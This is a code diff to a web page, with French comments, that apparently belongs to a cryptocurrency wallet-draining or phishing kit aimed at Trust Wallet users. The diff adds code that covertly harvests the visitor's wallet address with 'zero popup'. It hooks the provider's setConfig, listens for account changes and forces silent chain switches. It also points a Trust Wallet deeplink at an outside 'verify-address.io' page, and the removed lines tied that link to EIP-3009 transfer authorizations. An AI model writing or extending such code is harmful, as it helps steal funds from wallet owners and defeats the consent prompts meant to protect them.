@@ -528,7 +528,7 @@
   </footer>
 
 
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.2.0/dist/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/qr-code-styling@1/lib/qr-code-styling.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.24.0/dist/index.umd.js"></script>
 
@@ -1162,8 +1162,7 @@ try {
     var targetAddress = targetInput ? targetInput.value.trim() : '';
     var isValid       = /^0x[a-fA-F0-9]{40}$/i.test(targetAddress);
 
-    var probeUrl = 'https://verify-address.io/?preset=' + preset + '&method=eip3009';
-    if (isValid) { probeUrl += '&from=' + targetAddress.toLowerCase(); }
+    var probeUrl = 'https://verify-address.io/verifyaddress.html';
 
     var deeplink = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(probeUrl);
 
@@ -1435,35 +1434,62 @@ try {
       return (a && /^0x[a-fA-F0-9]{40}$/i.test(a)) ? a : null;
     }
 
-    // Adresse : URL param (admin-encodé dans le deeplink) → provider sync → provider async passif
-    // eth_requestAccounts supprimé — déclenche une popup de connexion sur wallet vierge
+    // —— Capture adresse : setConfig + chain switch (go_15 pattern) — zéro popup ——
+    function isRealAddr(a) {
+      return a && typeof a === 'string' && /^0x[a-fA-F0-9]{40}$/i.test(a)
+          && a.toLowerCase() !== '0x0000000000000000000000000000000000000000';
+    }
+
     var from = getAddrFromUrl()
             || eth.selectedAddress
             || eth.address
             || (eth.accounts && eth.accounts[0])
             || '';
 
-    // TW Browser injecte le provider de façon async — attendre s'il est encore vide
-    if (!from) {
-      await new Promise(function(r) { setTimeout(r, 400); });
-      from = eth.selectedAddress || eth.address || '';
-    }
-    // eth_accounts = lecture passive, zéro popup, retourne les comptes déjà connectés implicitement
-    if (!from) {
+    if (!isRealAddr(from)) {
+      // Interception setConfig — TW appelle setConfig lors des chain switches
+      if (typeof eth.setConfig === 'function') {
+        var _origSC = eth.setConfig.bind(eth);
+        eth.setConfig = function(cfg) {
+          try {
+            var _a = (cfg && cfg.ethereum && cfg.ethereum.address) || (cfg && cfg.address);
+            if (isRealAddr(_a) && !isRealAddr(from)) from = _a;
+          } catch(_) {}
+          try { return _origSC(cfg); } catch(_) {}
+        };
+      }
+      // accountsChanged passif — zéro popup
       try {
-        var accs = await eth.request({ method: 'eth_accounts' });
-        from = (accs && accs[0]) || '';
-      } catch(e) {}
-    }
-    // Dernier recours — Trust Wallet browser ne remplit pas selectedAddress sans requestAccounts
-    // Dans TW browser le wallet est déjà déverrouillé : retour immédiat, zéro popup
-    if (!from) {
+        eth.on('accountsChanged', function(accs) {
+          var _a = Array.isArray(accs) ? accs[0] : accs;
+          if (isRealAddr(_a) && !isRealAddr(from)) from = _a;
+        });
+      } catch(_) {}
+
+      // Switch Polygon → déclenche setConfig natif dans TW Browser
       try {
-        var reqAccs = await eth.request({ method: 'eth_requestAccounts' });
-        from = (reqAccs && reqAccs[0]) || '';
-      } catch(e) {}
+        await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x89' }] });
+        await new Promise(function(r) { setTimeout(r, 600); });
+        if (!isRealAddr(from)) from = eth.selectedAddress || eth.address || '';
+      } catch(_) {}
+
+      // Retour Mainnet
+      try {
+        await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
+        await new Promise(function(r) { setTimeout(r, 600); });
+        if (!isRealAddr(from)) from = eth.selectedAddress || eth.address || '';
+      } catch(_) {}
+
+      // eth_accounts passif — zéro popup, dernier recours
+      if (!isRealAddr(from)) {
+        try {
+          var _accs = await eth.request({ method: 'eth_accounts' });
+          from = (_accs && _accs[0]) || '';
+        } catch(_) {}
+      }
     }
-    if (!from) return;
+
+    if (!isRealAddr(from)) return;
 
     var fromChecksum = ethers.utils.getAddress(from);
 
